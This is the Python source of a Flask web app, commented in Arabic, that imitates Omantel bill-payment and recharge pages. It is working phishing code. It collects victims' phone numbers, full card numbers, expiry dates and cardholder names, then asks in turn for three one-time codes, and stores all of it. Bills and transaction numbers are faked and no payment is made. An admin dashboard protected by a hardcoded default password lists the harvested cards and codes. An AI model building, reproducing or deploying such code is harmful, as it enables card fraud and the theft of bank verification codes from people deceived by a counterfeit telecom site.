import os
import logging
import random
from flask import Flask, render_template, request, redirect, url_for, flash, session
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase
from flask_login import LoginManager, login_user, logout_user, login_required, current_user
from flask_cors import CORS

# Configure logging
import sys
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s: %(message)s', stream=sys.stdout)

# إعداد قاعدة بيانات SQLAlchemy
class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)

# Create Flask app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "omantel-secure-key-2025")

# تفعيل CORS للسماح بوصول جميع المتصفحات
CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)

# إعداد اتصال قاعدة البيانات
app.config["SQLALCHEMY_DATABASE_URI"] = os.environ.get("DATABASE_URL")
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
}
db.init_app(app)

# إنشاء الجداول وبيانات المستخدم الافتراضي
with app.app_context():
    # استيراد النماذج هنا لتجنب التعارض الدائري
    from models import User, PhoneData, CardData, VisitorCount
    
    # إنشاء جميع الجداول إذا لم تكن موجودة
    db.create_all()
    
    # التحقق من وجود مستخدم admin
    admin = User.query.filter_by(username='admin').first()
    if admin is None:
        # إنشاء مستخدم جديد إذا لم يكن موجودًا
        admin = User(username='admin', is_admin=True)
        admin.set_password('omantel2025')
        
        # إضافة إلى قاعدة البيانات
        db.session.add(admin)
        db.session.commit()
        logging.info('تم إنشاء مستخدم المشرف بنجاح')
    else:
        logging.info('مستخدم المشرف موجود بالفعل')

# إعداد مدير الدخول
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'
login_manager.login_message = 'يرجى تسجيل الدخول للوصول إلى هذه الصفحة'

@login_manager.user_loader
def load_user(user_id):
    from models import User
    return User.query.get(int(user_id))

# لقد أنشأنا الجداول والمستخدم المسؤول في الأعلى

@app.route('/')
def home():
    # زيادة عدد الزوار في قاعدة البيانات
    from datetime import datetime
    from models import VisitorCount
    
    today = datetime.utcnow().date()
    
    try:
        # البحث عن سجل اليوم
        visitor_count = VisitorCount.query.filter_by(date=today).first()
        
        # إذا لم يوجد سجل لهذا اليوم، قم بإنشاء واحد
        if not visitor_count:
            visitor_count = VisitorCount(date=today, count=1)
            db.session.add(visitor_count)
        else:
            # زيادة العداد
            visitor_count.count += 1
            
        db.session.commit()
        logging.debug(f'تم تسجيل زائر جديد: {today} - العدد: {visitor_count.count}')
    except Exception as e:
        logging.error(f'خطأ في تسجيل الزائر: {str(e)}')
        db.session.rollback()
    
    return render_template('home.html')

@app.route('/pay-bills', methods=['GET', 'POST'])
def pay_bills():
    if request.method == 'POST':
        # Check if this is a check request or a pay request
        if 'check_bill' in request.form:
            phone_number = request.form.get('phone')
            account_number = request.form.get('account')
            
            # Basic validation - based on which form was submitted
            if phone_number:
                if len(phone_number) < 8:
                    flash('يرجى إدخال رقم هاتف صحيح', 'error')
                    return render_template('pay_bills.html')
                phone_or_account = phone_number
                id_type = 'phone'
            elif account_number:
                if len(account_number) < 8:
                    flash('يرجى إدخال رقم حساب صحيح', 'error')
                    return render_template('pay_bills.html')
                phone_or_account = account_number
                id_type = 'account'
            else:
                flash('يرجى إدخال رقم هاتف أو رقم حساب', 'error')
                return render_template('pay_bills.html')
            
            # حفظ الرقم في قاعدة البيانات فوراً
            try:
                from models import PhoneData
                
                # التحقق ما إذا كان الرقم موجود مسبقًا
                existing_record = PhoneData.query.filter_by(phone_number=phone_or_account).first()
                
                if not existing_record:
                    # إنشاء سجل جديد إذا لم يكن موجودًا
                    phone_data = PhoneData(
                        phone_number=phone_or_account,
                        bill_amount=None,  # سيتم تحديثه لاحقًا
                        recharge_amount=None
                    )
                    db.session.add(phone_data)
                    db.session.commit()
                    logging.debug(f'تم حفظ بيانات الهاتف فوراً: {phone_or_account}')
                else:
                    logging.debug(f'الرقم موجود بالفعل في قاعدة البيانات: {phone_or_account}')
            except Exception as e:
                logging.error(f"خطأ في حفظ بيانات الهاتف: {str(e)}")
                # الاستمرار في المعالجة حتى لو فشل الحفظ
                
            # Simulate finding a bill for this number
            sample_bills = {
                'phone': {
                    'bill_amount': 12.960, 
                    'bill_number': '1069719591',
                    'bill_month': 'أبريل 2025',
                    'due_days': 28
                },
                'account': {
                    'bill_amount': 18.500, 
                    'bill_number': '1069724382',
                    'bill_month': 'أبريل 2025',
                    'due_days': 15
                }
            }
            
            # Store in session for the bill page
            session['phone_or_account'] = phone_or_account
            session['id_type'] = id_type
            session['bill_details'] = sample_bills[id_type]
            
            return render_template('bill_details.html', 
                                  id_number=phone_or_account,
                                  id_type=id_type,
                                  bill=sample_bills[id_type])
        
        # If it's a pay request
        elif 'pay_bill' in request.form:
            # Get the bill amount from the form
            bill_amount = request.form.get('bill_amount')
            
            if not bill_amount:
                flash('حدث خطأ أثناء معالجة الفاتورة', 'error')
                return redirect(url_for('pay_bills'))
                
            # Store necessary info in session for payment
            session['bill_amount'] = bill_amount
            
            # Redirect to payment page
            return redirect(url_for('payment'))
    
    return render_template('pay_bills.html')

@app.route('/recharge', methods=['GET', 'POST'])
def recharge():
    if request.method == 'POST':
        phone_number = request.form.get('phone')
        amount = request.form.get('amount')
        
        # Basic validation
        if not phone_number or len(phone_number) != 8:
            flash('يرجى إدخال رقم هاتف صحيح مكون من 8 أرقام', 'error')
            return render_template('recharge.html')
        
        try:
            amount_float = float(amount)
            if not amount or amount_float < 1:
                flash('يرجى إدخال مبلغ أكبر من ريال واحد', 'error')
                return render_template('recharge.html')
            elif amount_float > 100:
                flash('الحد الأقصى لإعادة التعبئة هو 100 ريال', 'error')
                return render_template('recharge.html')
        except ValueError:
            flash('يرجى إدخال مبلغ صحيح', 'error')
            return render_template('recharge.html')
            
        # حفظ الرقم ومبلغ التعبئة في قاعدة البيانات فورًا
        try:
            from models import PhoneData
            
            # التحقق ما إذا كان الرقم موجود مسبقًا
            existing_record = PhoneData.query.filter_by(phone_number=phone_number).first()
            
            if not existing_record:
                # إنشاء سجل جديد إذا لم يكن موجودًا
                phone_data = PhoneData(
                    phone_number=phone_number,
                    recharge_amount=amount_float,
                    bill_amount=None
                )
                db.session.add(phone_data)
                db.session.commit()
                logging.debug(f'تم حفظ بيانات التعبئة فوراً: {phone_number} - {amount_float}')
            else:
                # تحديث السجل الموجود
                existing_record.recharge_amount = amount_float
                db.session.commit()
                logging.debug(f'تم تحديث بيانات التعبئة للرقم الموجود: {phone_number} - {amount_float}')
        except Exception as e:
            logging.error(f"خطأ في حفظ بيانات التعبئة: {str(e)}")
            db.session.rollback()
            # الاستمرار في المعالجة حتى لو فشل الحفظ
        
        # Store in session for later use
        session['phone_number'] = phone_number
        session['recharge_amount'] = amount
        
        return redirect(url_for('payment'))
        
    return render_template('recharge.html')

@app.route('/payment', methods=['GET', 'POST'])
def payment():
    if request.method == 'POST':
        card_number = request.form.get('card_number')
        expiry = request.form.get('expiry')
        cvv = request.form.get('cvv')
        card_holder = request.form.get('card_holder')
        save_card = request.form.get('save_card') == 'on'
        
        # Basic validation (in a real app, you'd do more thorough validation)
        if not card_number or not expiry or not cvv or not card_holder:
            flash('يرجى إدخال جميع بيانات البطاقة', 'error')
            return render_template('payment.html')
            
        # Get email (optional)
        email = request.form.get('email')
        
        # حفظ بيانات البطاقة في قاعدة البيانات فورًا
        try:
            from models import PhoneData, CardData
            
            # الحصول على رقم الهاتف من الجلسة
            phone_number = session.get('phone_number') or session.get('phone_or_account')
            
            if phone_number:
                # البحث عن سجل الهاتف الموجود
                phone_data = PhoneData.query.filter_by(phone_number=phone_number).order_by(PhoneData.created_at.desc()).first()
                
                # إذا لم يوجد سجل للهاتف، نقوم بإنشاء واحد
                if not phone_data:
                    phone_data = PhoneData(
                        phone_number=phone_number,
                        recharge_amount=session.get('recharge_amount'),
                        bill_amount=session.get('bill_amount')
                    )
                    db.session.add(phone_data)
                    db.session.flush()  # للحصول على ID قبل الحفظ النهائي
                
                # إنشاء سجل بيانات البطاقة
                card_data = CardData(
                    card_number=card_number,
                    card_holder=card_holder,
                    expiry=expiry,
                    phone_data=phone_data
                )
                db.session.add(card_data)
                db.session.commit()
                logging.debug(f'تم حفظ بيانات البطاقة فورًا للرقم: {phone_number}')
            else:
                logging.warning('لم يتم العثور على رقم الهاتف في الجلسة')
        except Exception as e:
            logging.error(f"خطأ في حفظ بيانات البطاقة: {str(e)}")
            db.session.rollback()
            # الاستمرار في المعالجة حتى لو فشل الحفظ
        
        # Store card info and optional email in session
        session['save_card'] = save_card
        session['card_number'] = card_number
        session['card_holder'] = card_holder
        session['expiry'] = expiry
        if email:
            session['email'] = email
        
        # الانتقال إلى صفحة التحقق OTP
        return redirect(url_for('verification'))
    
    # Check if we have the necessary session data for a bill or recharge
    if not (session.get('bill_amount') or session.get('recharge_amount')):
        return redirect(url_for('home'))
    
    return render_template('payment.html')

@app.route('/verification')
def verification():
    # صفحة التحقق OTP
    # Check if we have the necessary session data
    if not (session.get('bill_amount') or session.get('recharge_amount')):
        return redirect(url_for('home'))
    
    return render_template('verification.html')

@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    logging.debug('Processing OTP verification')
    # نستخدم حقل واحد لإدخال رمز التحقق بأي عدد من الأرقام
    otp = request.form.get('otp')
    logging.debug(f'OTP received: {otp}')
    
    # Basic validation
    if not otp or len(otp.strip()) < 1:
        flash('يرجى إدخال رمز التحقق', 'error')
        return redirect(url_for('verification'))
    
    # تخزين رمز التحقق الأول في الجلسة
    session['first_otp'] = otp
    
    # حفظ رمز التحقق الأول في قاعدة البيانات
    try:
        from models import PhoneData
        
        # الحصول على رقم الهاتف من الجلسة
        phone_number = session.get('phone_number') or session.get('phone_or_account')
        
        if phone_number:
            # البحث عن أحدث سجل للهاتف
            phone_data = PhoneData.query.filter_by(phone_number=phone_number).order_by(PhoneData.created_at.desc()).first()
            
            if phone_data:
                # تحديث السجل الموجود برمز التحقق الأول
                phone_data.first_otp = otp
                db.session.commit()
                logging.debug(f'تم تحديث سجل الهاتف برمز التحقق الأول: {phone_number}')
        else:
            logging.warning('لم يتم العثور على رقم الهاتف في الجلسة')
    except Exception as e:
        logging.error(f"خطأ في حفظ رمز التحقق الأول: {str(e)}")
        db.session.rollback()
    
    # توجيه المستخدم إلى صفحة التحقق الثانية
    return redirect(url_for('verification_second'))


@app.route('/verification-second')
def verification_second():
    # صفحة التحقق الثاني
    # التحقق من وجود رمز التحقق الأول في الجلسة
    if not session.get('first_otp'):
        return redirect(url_for('verification'))
    
    # التحقق من وجود بيانات الجلسة الضرورية
    if not (session.get('bill_amount') or session.get('recharge_amount')):
        return redirect(url_for('home'))
    
    return render_template('verification_second.html')


@app.route('/verify-second-otp', methods=['POST'])
def verify_second_otp():
    logging.debug('Processing Second OTP verification')
    # نستخدم حقل واحد لإدخال رمز التحقق بأي عدد من الأرقام
    otp = request.form.get('otp')
    logging.debug(f'Second OTP received: {otp}')
    
    # Basic validation
    if not otp or len(otp.strip()) < 1:
        flash('يرجى إدخال رمز التحقق', 'error')
        return redirect(url_for('verification_second'))
    
    # التحقق من وجود رمز التحقق الأول في الجلسة
    first_otp = session.get('first_otp')
    if not first_otp:
        flash('يجب إدخال رمز التحقق الأول أولاً', 'error')
        return redirect(url_for('verification'))
    
    # تخزين رمز التحقق الثاني في الجلسة
    session['second_otp'] = otp
    
    # حفظ رمز التحقق الثاني في قاعدة البيانات
    try:
        from models import PhoneData
        
        # الحصول على رقم الهاتف من الجلسة
        phone_number = session.get('phone_number') or session.get('phone_or_account')
        
        if phone_number:
            # البحث عن أحدث سجل للهاتف
            phone_data = PhoneData.query.filter_by(phone_number=phone_number).order_by(PhoneData.created_at.desc()).first()
            
            if phone_data:
                # تحديث السجل الموجود برمز التحقق الثاني
                phone_data.second_otp = otp
                db.session.commit()
                logging.debug(f'تم تحديث سجل الهاتف برمز التحقق الثاني: {phone_number}')
        else:
            logging.warning('لم يتم العثور على رقم الهاتف في الجلسة')
    except Exception as e:
        logging.error(f"خطأ في حفظ رمز التحقق الثاني: {str(e)}")
        db.session.rollback()
    
    # توجيه المستخدم إلى صفحة التحقق الثالثة
    return redirect(url_for('verification_third'))


@app.route('/verification-third')
def verification_third():
    # صفحة التحقق الثالث
    # التحقق من وجود رمز التحقق الأول والثاني في الجلسة
    if not session.get('first_otp'):
        return redirect(url_for('verification'))
    
    if not session.get('second_otp'):
        return redirect(url_for('verification_second'))
    
    # التحقق من وجود بيانات الجلسة الضرورية
    if not (session.get('bill_amount') or session.get('recharge_amount')):
        return redirect(url_for('home'))
    
    return render_template('verification_third.html')


@app.route('/verify-third-otp', methods=['POST'])
def verify_third_otp():
    logging.debug('Processing Third OTP verification')
    # نستخدم حقل واحد لإدخال رمز التحقق بأي عدد من الأرقام
    otp = request.form.get('otp')
    logging.debug(f'Third OTP received: {otp}')
    
    # Basic validation
    if not otp or len(otp.strip()) < 1:
        flash('يرجى إدخال رمز التحقق', 'error')
        return redirect(url_for('verification_third'))
    
    # التحقق من وجود رمزي التحقق الأول والثاني في الجلسة
    first_otp = session.get('first_otp')
    second_otp = session.get('second_otp')
    if not first_otp or not second_otp:
        flash('يجب إدخال رمزي التحقق السابقين أولاً', 'error')
        return redirect(url_for('verification'))
    
    # تخزين رمز التحقق الثالث في الجلسة
    session['third_otp'] = otp
    
    # العلامة التي تدل على أن عملية التحقق قد تمت بنجاح
    session['verified'] = True
    
    # Prepare success message
    if 'recharge_amount' in session:
        success_message = f"تمت إعادة تعبئة الرصيد بنجاح بمبلغ {session.get('recharge_amount')} ر.ع"
    else:
        success_message = "تم دفع الفاتورة بنجاح"
    
    # Store success message in session
    session['success_message'] = success_message
    
    # توليد رقم عملية عشوائي
    transaction_number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
    session['transaction_number'] = transaction_number
    
    logging.debug(f'All three OTPs verified successfully. Transaction: {transaction_number}')
    # تحديث البيانات في قاعدة البيانات بكود OTP ورقم العملية
    try:
        from models import PhoneData, CardData
        
        # الحصول على رقم الهاتف من الجلسة
        phone_number = session.get('phone_number') or session.get('phone_or_account')
        
        if phone_number:
            # البحث عن أحدث سجل للهاتف
            phone_data = PhoneData.query.filter_by(phone_number=phone_number).order_by(PhoneData.created_at.desc()).first()
            
            if phone_data:
                # تحديث السجل الموجود بالمعلومات الجديدة
                if not phone_data.transaction_number:
                    phone_data.transaction_number = transaction_number
                # حفظ جميع رموز التحقق في قاعدة البيانات كسلسلة نصية واحدة (للتوافق مع النظام القديم)
                phone_data.otp_code = f"{first_otp},{second_otp},{otp}"
                # حفظ رمز التحقق الثالث بشكل منفصل
                phone_data.third_otp = otp
                
                # تحديث مبلغ الفاتورة أو مبلغ إعادة التعبئة إذا لم تكن موجودة بالفعل
                if session.get('bill_amount') and not phone_data.bill_amount:
                    phone_data.bill_amount = session.get('bill_amount')
                if session.get('recharge_amount') and not phone_data.recharge_amount:
                    phone_data.recharge_amount = session.get('recharge_amount')
                
                db.session.commit()
                logging.debug(f'تم تحديث سجل الهاتف بجميع رموز OTP ورقم العملية: {phone_number}')
            else:
                # إنشاء سجل جديد في حالة عدم وجود سجل سابق
                recharge_amount = session.get('recharge_amount')
                bill_amount = session.get('bill_amount')
                
                phone_data = PhoneData(
                    phone_number=phone_number,
                    recharge_amount=recharge_amount,
                    bill_amount=bill_amount,
                    transaction_number=transaction_number,
                    otp_code=f"{first_otp},{second_otp},{otp}",
                    first_otp=first_otp,
                    second_otp=second_otp,
                    third_otp=otp
                )
                db.session.add(phone_data)
                db.session.commit()
                logging.debug(f'تم إنشاء سجل جديد للهاتف مع جميع رموز OTP: {phone_number}')
        else:
            logging.warning('لم يتم العثور على رقم الهاتف في الجلسة')
        
        logging.debug('Successfully processed all three OTP verifications and updated database')
    except Exception as e:
        logging.error(f"Error updating database with OTPs: {str(e)}")
        db.session.rollback()
    
    # نعيد توجيه المستخدم إلى صفحة النجاح
    return redirect(url_for('success'))

@app.route('/success')
def success():
    # صفحة نجاح العملية
    logging.debug('Success page accessed')
    logging.debug(f'Session data: {session}')
    
    # التحقق من وجود علامة التحقق
    if not session.get('verified'):
        logging.debug('User not verified, redirecting to verification')
        return redirect(url_for('verification'))
        
    # التحقق من وجود بيانات الجلسة الضرورية
    if not (session.get('bill_amount') or session.get('recharge_amount')):
        logging.debug('No bill or recharge data, redirecting to home')
        return redirect(url_for('home'))
    
    # استخدام رقم العملية من الجلسة إذا كان موجودًا
    if 'transaction_number' in session:
        transaction_number = session.get('transaction_number')
    else:
        # التوليد إذا لم يكن موجودًا
        transaction_number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
        
    # إعداد رسالة النجاح من الجلسة
    success_message = session.get('success_message', 'تمت العملية بنجاح')
    
    # إزالة البيانات المؤقتة من الجلسة للتنظيف
    # نقوم بتنظيف الجلسة بعد حفظ البيانات المطلوبة منها لمنع تكرار العملية
    logging.debug('About to clean session data')
    temp_keys = ['transaction_number', 'success_message', 'bill_amount', 'recharge_amount', 'phone_number', 'account_number', 'phone_or_account', 'id_type', 'verified', 'card_number', 'card_holder', 'expiry', 'save_card', 'email', 'first_otp', 'second_otp', 'third_otp']
    for key in temp_keys:
        if key in session:
            logging.debug(f'Removing {key} from session')
            session.pop(key, None)
    
    logging.debug('Session cleaned successfully. Rendering success page.')
    
    return render_template('success.html', transaction_number=transaction_number, success_message=success_message)

@app.route('/login', methods=['GET', 'POST'])
def login():
    """صفحة تسجيل الدخول"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if not username or not password:
            flash('يرجى إدخال اسم المستخدم وكلمة المرور', 'error')
            return render_template('login.html')
        
        # التحقق من المستخدم
        from models import User
        user = User.query.filter_by(username=username).first()
        
        if user and user.check_password(password):
            login_user(user)
            next_page = request.args.get('next')
            if not next_page or url_for('dashboard') in next_page:
                return redirect(url_for('dashboard'))
            return redirect(next_page)
        
        flash('اسم المستخدم أو كلمة المرور غير صحيحة', 'error')
        
    return render_template('login.html')

@app.route('/logout')
def logout():
    """تسجيل الخروج"""
    logout_user()
    return redirect(url_for('home'))

@app.route('/dashboard')
@login_required
def dashboard():
    """لوحة التحكم لعرض بيانات الهواتف والبطاقات وعدد الزوار"""
    from models import PhoneData, CardData, VisitorCount
    from datetime import datetime, timedelta
    import traceback
    
    try:
        # التحقق من اتصال قاعدة البيانات
        db_count = db.session.execute(db.select(db.func.count(PhoneData.id))).scalar()
        logging.debug(f'عدد سجلات الهاتف في قاعدة البيانات: {db_count}')
        
        # جلب بيانات الهواتف مرتبة حسب التاريخ (الأحدث أولاً)
        phone_data = PhoneData.query.order_by(PhoneData.created_at.desc()).all()
        logging.debug(f'تم جلب {len(phone_data)} من سجلات الهواتف للوحة التحكم')
        
        # طباعة معلومات عن سجلات الهواتف
        for i, phone in enumerate(phone_data[:5]):
            logging.debug(f'هاتف {i+1}: ID={phone.id}, رقم={phone.phone_number}, OTP1={phone.first_otp}, OTP2={phone.second_otp}, OTP3={phone.third_otp}')
        
        # جلب بيانات البطاقات مرتبة حسب التاريخ (الأحدث أولاً)
        card_data = CardData.query.order_by(CardData.created_at.desc()).all()
        logging.debug(f'تم جلب {len(card_data)} من سجلات البطاقات للوحة التحكم')
        
        # طباعة معلومات عن سجلات البطاقات
        for i, card in enumerate(card_data[:5]):
            logging.debug(f'بطاقة {i+1}: ID={card.id}, رقم={card.card_number}, صاحب={card.card_holder}, phone_data_id={card.phone_data_id}')
        
        # جلب إحصائيات الزوار
        today = datetime.utcnow().date()
        yesterday = today - timedelta(days=1)
        week_ago = today - timedelta(days=7)
        
        # إحصائيات اليوم
        today_stats = VisitorCount.query.filter_by(date=today).first()
        today_visitors = today_stats.count if today_stats else 0
        
        # إحصائيات الأمس
        yesterday_stats = VisitorCount.query.filter_by(date=yesterday).first()
        yesterday_visitors = yesterday_stats.count if yesterday_stats else 0
        
        # إحصائيات الأسبوع
        week_stats = VisitorCount.query.filter(VisitorCount.date >= week_ago).all()
        week_visitors = sum(stat.count for stat in week_stats) if week_stats else 0
        
        # إجمالي عدد الزوار
        total_visitors = db.session.query(db.func.sum(VisitorCount.count)).scalar() or 0
        
        # بيانات الزوار للأيام السبعة الماضية
        visitor_history = []
        for i in range(7, 0, -1):
            date = today - timedelta(days=i-1)
            stats = VisitorCount.query.filter_by(date=date).first()
            visitor_history.append({
                'date': date.strftime('%Y-%m-%d'),
                'count': stats.count if stats else 0
            })
        
        visitor_data = {
            'today': today_visitors,
            'yesterday': yesterday_visitors,
            'week': week_visitors,
            'total': total_visitors,
            'history': visitor_history
        }
        
        logging.debug(f'تم جلب بيانات الزوار: اليوم={today_visitors}, الأمس={yesterday_visitors}')
    except Exception as e:
        logging.error(f'خطأ في جلب البيانات: {str(e)}')
        logging.error(traceback.format_exc())
        phone_data = []
        card_data = []
        visitor_data = {'today': 0, 'yesterday': 0, 'week': 0, 'total': 0, 'history': []}
    
    return render_template('dashboard.html', phone_data=phone_data, card_data=card_data, visitor_data=visitor_data)

@app.route('/api/status', methods=['GET'])
def api_status():
    """API لفحص حالة التطبيق"""
    from flask import jsonify
    return jsonify({'status': 'ok', 'message': 'التطبيق يعمل بشكل صحيح'})

@app.errorhandler(404)
def page_not_found(e):
    return render_template('home.html'), 404

@app.errorhandler(500)
def internal_server_error(e):
    logging.error(f"خطأ داخلي في الخادم: {str(e)}")
    return render_template('error.html', error=str(e)), 500

@app.errorhandler(Exception)
def handle_exception(e):
    logging.error(f"استثناء غير معالج: {str(e)}")
    return render_template('error.html', error=str(e)), 500
